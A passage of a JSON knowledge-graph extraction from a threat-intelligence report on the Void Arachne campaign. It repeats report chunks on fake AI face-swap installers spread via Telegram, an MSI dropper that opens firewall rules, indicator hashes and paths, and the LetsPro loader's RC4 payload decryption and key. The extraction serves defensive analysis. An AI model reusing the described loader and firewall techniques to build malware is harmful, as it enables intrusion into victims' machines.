            "Header 4": "#### Voice-altering and face-swapping AI technologies promoted on Telegram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Voice-altering and face-swapping AI technologies promoted on Telegram"
            ],
            "content_type": "text",
            "token_length": 166,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 9,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "AI Voice and Face Cloning",
      "type": "Procedure",
      "id": "procedure--ai-voice-face-cloning",
      "description": "使用AI进行语音和面部克隆",
      "labels": "Procedure",
      "chunks_info": [
        {
          "chunk_id": 9,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Voice-altering and face-swapping AI technologies promoted on Telegram  \nIn addition to fake nudifier applications, we saw additional channels advertising face-swapping and voice-changing software. Like the rise of nudifiers and deepfake-generating applications, we have also observed the rise of AI-powered apps that have face-swapping and voice-altering capabilities.  \nWe’ve found that malicious MSI files were shared and pinned on various AI video and voice manipulation Telegram channels.  \nFigure 10 shows a screen capture of a threat actor video posted on Void Arachne’s Telegram channel wherein the malicious actor can be seen using AI face- and voice-cloning technology on a WhatsApp call. Figure 12, on the other hand, shows a malicious voice-altering and face-swapping AI app installer on Telegram.",
          "chunk_length": 924,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Voice-altering and face-swapping AI technologies promoted on Telegram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Voice-altering and face-swapping AI technologies promoted on Telegram"
            ],
            "content_type": "text",
            "token_length": 166,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 9,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "AI App Installer",
      "type": "Tool",
      "id": "tool--ai-app-installer",
      "description": "AI应用安装程序",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 9,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Voice-altering and face-swapping AI technologies promoted on Telegram  \nIn addition to fake nudifier applications, we saw additional channels advertising face-swapping and voice-changing software. Like the rise of nudifiers and deepfake-generating applications, we have also observed the rise of AI-powered apps that have face-swapping and voice-altering capabilities.  \nWe’ve found that malicious MSI files were shared and pinned on various AI video and voice manipulation Telegram channels.  \nFigure 10 shows a screen capture of a threat actor video posted on Void Arachne’s Telegram channel wherein the malicious actor can be seen using AI face- and voice-cloning technology on a WhatsApp call. Figure 12, on the other hand, shows a malicious voice-altering and face-swapping AI app installer on Telegram.",
          "chunk_length": 924,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Voice-altering and face-swapping AI technologies promoted on Telegram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Voice-altering and face-swapping AI technologies promoted on Telegram"
            ],
            "content_type": "text",
            "token_length": 166,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 9,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Behind the Great Wall Void Arachne Targets Chinese",
      "type": "Report",
      "id": "report--behind-great-wall",
      "description": "威胁情报报告",
      "labels": "Report",
      "chunks_info": [
        {
          "chunk_id": 9,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Voice-altering and face-swapping AI technologies promoted on Telegram  \nIn addition to fake nudifier applications, we saw additional channels advertising face-swapping and voice-changing software. Like the rise of nudifiers and deepfake-generating applications, we have also observed the rise of AI-powered apps that have face-swapping and voice-altering capabilities.  \nWe’ve found that malicious MSI files were shared and pinned on various AI video and voice manipulation Telegram channels.  \nFigure 10 shows a screen capture of a threat actor video posted on Void Arachne’s Telegram channel wherein the malicious actor can be seen using AI face- and voice-cloning technology on a WhatsApp call. Figure 12, on the other hand, shows a malicious voice-altering and face-swapping AI app installer on Telegram.",
          "chunk_length": 924,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Voice-altering and face-swapping AI technologies promoted on Telegram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Voice-altering and face-swapping AI technologies promoted on Telegram"
            ],
            "content_type": "text",
            "token_length": 166,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 9,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Chinese Users",
      "type": "Target",
      "id": "target--chinese-users",
      "description": "中文用户",
      "labels": "Target",
      "chunks_info": [
        {
          "chunk_id": 9,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Voice-altering and face-swapping AI technologies promoted on Telegram  \nIn addition to fake nudifier applications, we saw additional channels advertising face-swapping and voice-changing software. Like the rise of nudifiers and deepfake-generating applications, we have also observed the rise of AI-powered apps that have face-swapping and voice-altering capabilities.  \nWe’ve found that malicious MSI files were shared and pinned on various AI video and voice manipulation Telegram channels.  \nFigure 10 shows a screen capture of a threat actor video posted on Void Arachne’s Telegram channel wherein the malicious actor can be seen using AI face- and voice-cloning technology on a WhatsApp call. Figure 12, on the other hand, shows a malicious voice-altering and face-swapping AI app installer on Telegram.",
          "chunk_length": 924,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Voice-altering and face-swapping AI technologies promoted on Telegram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Voice-altering and face-swapping AI technologies promoted on Telegram"
            ],
            "content_type": "text",
            "token_length": 166,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 9,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Void Arachne",
      "type": "ThreatOrganization",
      "id": "threat-org--void-arachne",
      "description": "威胁组织",
      "labels": "ThreatOrganization",
      "chunks_info": [
        {
          "chunk_id": 9,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Voice-altering and face-swapping AI technologies promoted on Telegram  \nIn addition to fake nudifier applications, we saw additional channels advertising face-swapping and voice-changing software. Like the rise of nudifiers and deepfake-generating applications, we have also observed the rise of AI-powered apps that have face-swapping and voice-altering capabilities.  \nWe’ve found that malicious MSI files were shared and pinned on various AI video and voice manipulation Telegram channels.  \nFigure 10 shows a screen capture of a threat actor video posted on Void Arachne’s Telegram channel wherein the malicious actor can be seen using AI face- and voice-cloning technology on a WhatsApp call. Figure 12, on the other hand, shows a malicious voice-altering and face-swapping AI app installer on Telegram.",
          "chunk_length": 924,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Voice-altering and face-swapping AI technologies promoted on Telegram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Voice-altering and face-swapping AI technologies promoted on Telegram"
            ],
            "content_type": "text",
            "token_length": 166,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 9,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "DLL Installation Process",
      "type": "Procedure",
      "id": "procedure--dll-installation",
      "description": "使用动态链接库的安装过程",
      "labels": "Procedure",
      "chunks_info": [
        {
          "chunk_id": 11,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### *Letvpn* MSI analysis\n\nThis sectiondiscusses our analysis of the malicious files associated with Void Arachne’s campaign, starting with the *letvpn.msi* file.  \nThe malicious MSI file uses Dynamic Link Libraries (DLLs) during the installation process. These DLLs play a pivotal role during runtime, facilitating various essential operations including property management within MSI packages, scheduling tasks, and configuring firewall rules.  \nThe MSI file performs several tasks, such as creating scheduled tasks and configuring firewall parameters. Specifically, we have observed the creation and configuration of firewall rules via the *OnFwConfig* and *OnFwInstall* functions from *NetFirewall.dll,* which are designed to whitelist both inbound and outbound traffic associated with the malware for the public network profile only.  \nFigure 16 shows the configuration of the inbound firewall rule created to enable unrestricted access for the malware when connected to public networks, ensuring that the malware can operate without interruption.  \nFurthermore, *letvpn.msi* drops multiple hidden files, including the *LetsPro.exe* loader, within the designated directory path *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\.* Subsequently, it initiates the execution of the LetsPRO loader.",
          "chunk_length": 1378,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### *Letvpn* MSI analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### *Letvpn* MSI analysis"
            ],
            "content_type": "text",
            "token_length": 261,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 11,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Firewall Configuration",
      "type": "Procedure",
      "id": "procedure--firewall-config",
      "description": "通过NetFirewall.dll配置防火墙规则的过程",
      "labels": "Procedure",
      "chunks_info": [
        {
          "chunk_id": 11,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### *Letvpn* MSI analysis\n\nThis sectiondiscusses our analysis of the malicious files associated with Void Arachne’s campaign, starting with the *letvpn.msi* file.  \nThe malicious MSI file uses Dynamic Link Libraries (DLLs) during the installation process. These DLLs play a pivotal role during runtime, facilitating various essential operations including property management within MSI packages, scheduling tasks, and configuring firewall rules.  \nThe MSI file performs several tasks, such as creating scheduled tasks and configuring firewall parameters. Specifically, we have observed the creation and configuration of firewall rules via the *OnFwConfig* and *OnFwInstall* functions from *NetFirewall.dll,* which are designed to whitelist both inbound and outbound traffic associated with the malware for the public network profile only.  \nFigure 16 shows the configuration of the inbound firewall rule created to enable unrestricted access for the malware when connected to public networks, ensuring that the malware can operate without interruption.  \nFurthermore, *letvpn.msi* drops multiple hidden files, including the *LetsPro.exe* loader, within the designated directory path *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\.* Subsequently, it initiates the execution of the LetsPRO loader.",
          "chunk_length": 1378,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### *Letvpn* MSI analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### *Letvpn* MSI analysis"
            ],
            "content_type": "text",
            "token_length": 261,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 11,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Behind the Great Wall Void Arachne Targets Chinese",
      "type": "Report",
      "id": "report--behind-great-wall",
      "description": "威胁情报报告",
      "labels": "Report",
      "chunks_info": [
        {
          "chunk_id": 11,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### *Letvpn* MSI analysis\n\nThis sectiondiscusses our analysis of the malicious files associated with Void Arachne’s campaign, starting with the *letvpn.msi* file.  \nThe malicious MSI file uses Dynamic Link Libraries (DLLs) during the installation process. These DLLs play a pivotal role during runtime, facilitating various essential operations including property management within MSI packages, scheduling tasks, and configuring firewall rules.  \nThe MSI file performs several tasks, such as creating scheduled tasks and configuring firewall parameters. Specifically, we have observed the creation and configuration of firewall rules via the *OnFwConfig* and *OnFwInstall* functions from *NetFirewall.dll,* which are designed to whitelist both inbound and outbound traffic associated with the malware for the public network profile only.  \nFigure 16 shows the configuration of the inbound firewall rule created to enable unrestricted access for the malware when connected to public networks, ensuring that the malware can operate without interruption.  \nFurthermore, *letvpn.msi* drops multiple hidden files, including the *LetsPro.exe* loader, within the designated directory path *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\.* Subsequently, it initiates the execution of the LetsPRO loader.",
          "chunk_length": 1378,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### *Letvpn* MSI analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### *Letvpn* MSI analysis"
            ],
            "content_type": "text",
            "token_length": 261,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 11,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "NetFirewall.dll",
      "type": "Tool",
      "id": "tool--netfirewall-dll",
      "description": "配置防火墙规则的动态链接库",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 11,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### *Letvpn* MSI analysis\n\nThis sectiondiscusses our analysis of the malicious files associated with Void Arachne’s campaign, starting with the *letvpn.msi* file.  \nThe malicious MSI file uses Dynamic Link Libraries (DLLs) during the installation process. These DLLs play a pivotal role during runtime, facilitating various essential operations including property management within MSI packages, scheduling tasks, and configuring firewall rules.  \nThe MSI file performs several tasks, such as creating scheduled tasks and configuring firewall parameters. Specifically, we have observed the creation and configuration of firewall rules via the *OnFwConfig* and *OnFwInstall* functions from *NetFirewall.dll,* which are designed to whitelist both inbound and outbound traffic associated with the malware for the public network profile only.  \nFigure 16 shows the configuration of the inbound firewall rule created to enable unrestricted access for the malware when connected to public networks, ensuring that the malware can operate without interruption.  \nFurthermore, *letvpn.msi* drops multiple hidden files, including the *LetsPro.exe* loader, within the designated directory path *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\.* Subsequently, it initiates the execution of the LetsPRO loader.",
          "chunk_length": 1378,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### *Letvpn* MSI analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### *Letvpn* MSI analysis"
            ],
            "content_type": "text",
            "token_length": 261,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 11,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "letvpn.msi",
      "type": "Tool",
      "id": "tool--letvpn-msi",
      "description": "恶意MSI安装文件",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 11,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### *Letvpn* MSI analysis\n\nThis sectiondiscusses our analysis of the malicious files associated with Void Arachne’s campaign, starting with the *letvpn.msi* file.  \nThe malicious MSI file uses Dynamic Link Libraries (DLLs) during the installation process. These DLLs play a pivotal role during runtime, facilitating various essential operations including property management within MSI packages, scheduling tasks, and configuring firewall rules.  \nThe MSI file performs several tasks, such as creating scheduled tasks and configuring firewall parameters. Specifically, we have observed the creation and configuration of firewall rules via the *OnFwConfig* and *OnFwInstall* functions from *NetFirewall.dll,* which are designed to whitelist both inbound and outbound traffic associated with the malware for the public network profile only.  \nFigure 16 shows the configuration of the inbound firewall rule created to enable unrestricted access for the malware when connected to public networks, ensuring that the malware can operate without interruption.  \nFurthermore, *letvpn.msi* drops multiple hidden files, including the *LetsPro.exe* loader, within the designated directory path *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\.* Subsequently, it initiates the execution of the LetsPRO loader.",
          "chunk_length": 1378,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### *Letvpn* MSI analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### *Letvpn* MSI analysis"
            ],
            "content_type": "text",
            "token_length": 261,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 11,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "LetsPro.exe",
      "type": "Tool",
      "id": "tool--letspro-exe",
      "description": "加载器",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 11,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### *Letvpn* MSI analysis\n\nThis sectiondiscusses our analysis of the malicious files associated with Void Arachne’s campaign, starting with the *letvpn.msi* file.  \nThe malicious MSI file uses Dynamic Link Libraries (DLLs) during the installation process. These DLLs play a pivotal role during runtime, facilitating various essential operations including property management within MSI packages, scheduling tasks, and configuring firewall rules.  \nThe MSI file performs several tasks, such as creating scheduled tasks and configuring firewall parameters. Specifically, we have observed the creation and configuration of firewall rules via the *OnFwConfig* and *OnFwInstall* functions from *NetFirewall.dll,* which are designed to whitelist both inbound and outbound traffic associated with the malware for the public network profile only.  \nFigure 16 shows the configuration of the inbound firewall rule created to enable unrestricted access for the malware when connected to public networks, ensuring that the malware can operate without interruption.  \nFurthermore, *letvpn.msi* drops multiple hidden files, including the *LetsPro.exe* loader, within the designated directory path *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\.* Subsequently, it initiates the execution of the LetsPRO loader.",
          "chunk_length": 1378,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### *Letvpn* MSI analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### *Letvpn* MSI analysis"
            ],
            "content_type": "text",
            "token_length": 261,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 11,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "LetsPro Execution",
      "type": "Procedure",
      "id": "procedure--letspro-execution",
      "description": "执行LetsPro加载器的过程",
      "labels": "Procedure",
      "chunks_info": [
        {
          "chunk_id": 11,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### *Letvpn* MSI analysis\n\nThis sectiondiscusses our analysis of the malicious files associated with Void Arachne’s campaign, starting with the *letvpn.msi* file.  \nThe malicious MSI file uses Dynamic Link Libraries (DLLs) during the installation process. These DLLs play a pivotal role during runtime, facilitating various essential operations including property management within MSI packages, scheduling tasks, and configuring firewall rules.  \nThe MSI file performs several tasks, such as creating scheduled tasks and configuring firewall parameters. Specifically, we have observed the creation and configuration of firewall rules via the *OnFwConfig* and *OnFwInstall* functions from *NetFirewall.dll,* which are designed to whitelist both inbound and outbound traffic associated with the malware for the public network profile only.  \nFigure 16 shows the configuration of the inbound firewall rule created to enable unrestricted access for the malware when connected to public networks, ensuring that the malware can operate without interruption.  \nFurthermore, *letvpn.msi* drops multiple hidden files, including the *LetsPro.exe* loader, within the designated directory path *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\.* Subsequently, it initiates the execution of the LetsPRO loader.",
          "chunk_length": 1378,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### *Letvpn* MSI analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### *Letvpn* MSI analysis"
            ],
            "content_type": "text",
            "token_length": 261,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 11,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Dynamic Link Libraries",
      "type": "Tool",
      "id": "tool--dll",
      "description": "动态链接库",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 11,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### *Letvpn* MSI analysis\n\nThis sectiondiscusses our analysis of the malicious files associated with Void Arachne’s campaign, starting with the *letvpn.msi* file.  \nThe malicious MSI file uses Dynamic Link Libraries (DLLs) during the installation process. These DLLs play a pivotal role during runtime, facilitating various essential operations including property management within MSI packages, scheduling tasks, and configuring firewall rules.  \nThe MSI file performs several tasks, such as creating scheduled tasks and configuring firewall parameters. Specifically, we have observed the creation and configuration of firewall rules via the *OnFwConfig* and *OnFwInstall* functions from *NetFirewall.dll,* which are designed to whitelist both inbound and outbound traffic associated with the malware for the public network profile only.  \nFigure 16 shows the configuration of the inbound firewall rule created to enable unrestricted access for the malware when connected to public networks, ensuring that the malware can operate without interruption.  \nFurthermore, *letvpn.msi* drops multiple hidden files, including the *LetsPro.exe* loader, within the designated directory path *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\.* Subsequently, it initiates the execution of the LetsPRO loader.",
          "chunk_length": 1378,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### *Letvpn* MSI analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### *Letvpn* MSI analysis"
            ],
            "content_type": "text",
            "token_length": 261,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 11,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Behind the Great Wall Void Arachne Targets Chinese",
      "type": "Report",
      "id": "report--great-wall",
      "description": "威胁情报报告",
      "labels": "Report",
      "chunks_info": [
        {
          "chunk_id": 12,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### *Letvpn* MSI analysis\n\n| --- | --- | --- | --- |\n| **File name** | **Size** | **MD5 hash** | **Parent directory** |\n| 1 | 9996288 | D82362C15DDB7206010B8FCEC7F611C5 | *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0* |\n| LetsPRO.exe (Loader) | 40960 | FE7AEDAB70A5A58EFB84E6CB988D67A4 | *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0* |\n| LetsPRO.exe | 247272 | 7BB188DFEE179CBDE884A0E7D127B074 | *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX* |",
          "chunk_length": 576,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### *Letvpn* MSI analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### *Letvpn* MSI analysis"
            ],
            "content_type": "table",
            "token_length": 168,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 12,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "*Letvpn* MSI",
      "type": "Tool",
      "id": "tool--letvpn-msi",
      "description": "恶意MSI安装文件",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 12,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### *Letvpn* MSI analysis\n\n| --- | --- | --- | --- |\n| **File name** | **Size** | **MD5 hash** | **Parent directory** |\n| 1 | 9996288 | D82362C15DDB7206010B8FCEC7F611C5 | *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0* |\n| LetsPRO.exe (Loader) | 40960 | FE7AEDAB70A5A58EFB84E6CB988D67A4 | *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0* |\n| LetsPRO.exe | 247272 | 7BB188DFEE179CBDE884A0E7D127B074 | *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX* |",
          "chunk_length": 576,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### *Letvpn* MSI analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### *Letvpn* MSI analysis"
            ],
            "content_type": "table",
            "token_length": 168,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 12,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "LetsPRO.exe",
      "type": "Tool",
      "id": "tool--letspro-exe",
      "description": "恶意可执行文件",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 12,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### *Letvpn* MSI analysis\n\n| --- | --- | --- | --- |\n| **File name** | **Size** | **MD5 hash** | **Parent directory** |\n| 1 | 9996288 | D82362C15DDB7206010B8FCEC7F611C5 | *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0* |\n| LetsPRO.exe (Loader) | 40960 | FE7AEDAB70A5A58EFB84E6CB988D67A4 | *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0* |\n| LetsPRO.exe | 247272 | 7BB188DFEE179CBDE884A0E7D127B074 | *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX* |",
          "chunk_length": 576,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### *Letvpn* MSI analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### *Letvpn* MSI analysis"
            ],
            "content_type": "table",
            "token_length": 168,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 12,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "LetsPRO.exe (Loader)",
      "type": "Tool",
      "id": "tool--letspro-exe-loader",
      "description": "加载器组件",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 12,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### *Letvpn* MSI analysis\n\n| --- | --- | --- | --- |\n| **File name** | **Size** | **MD5 hash** | **Parent directory** |\n| 1 | 9996288 | D82362C15DDB7206010B8FCEC7F611C5 | *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0* |\n| LetsPRO.exe (Loader) | 40960 | FE7AEDAB70A5A58EFB84E6CB988D67A4 | *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0* |\n| LetsPRO.exe | 247272 | 7BB188DFEE179CBDE884A0E7D127B074 | *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX* |",
          "chunk_length": 576,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### *Letvpn* MSI analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### *Letvpn* MSI analysis"
            ],
            "content_type": "table",
            "token_length": 168,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 12,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Behind the Great Wall Void Arachne Targets Chinese",
      "type": "Report",
      "id": "report--great-wall",
      "description": "威胁情报报告",
      "labels": "Report",
      "chunks_info": [
        {
          "chunk_id": 14,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Trojan loader *LetsPro.exe* analysis\n\n*LetsPro.exe* is a trojan loader that decrypts, maps, and executes a second-stage payload in memory. The loader first reads and loads the content of a file named “1”, with the following content structure:  \nstruct payload\\_struct {\nuint32\\_t flag; // 1 if the data is encrypted, 0 if it's plaintext/Memory clean up\nuint32\\_t fileSize; // Size of the encrypted data in bytes\nchar encryptedData[]; // The encrypted payload\n};  \nIt then identifies the encrypted data section within the file. The initial part of the file structure contains a flag set to 1, which indicates encryption. The loader uses the Rivest Cipher 4 (RC4) algorithm with the key \"0x678E0B00\" to decrypt this data. After decryption, the payload, which is now executable code, is mapped into the process's memory space and executed.  \nThe decryption key structure is defined as follows:  \nstruct decryption\\_key\\_struct {\nuint32\\_t memory\\_cleanup; // Flag for memory cleanup after decryption\nuint32\\_t keySize; // Size of the decryption key\nchar key[]; // Decryption key\n};  \nThe following code snippet demonstrates the core part of the loader logic:  \nThe following snippet demonstrates the decrypted file 1 structure in memory:",
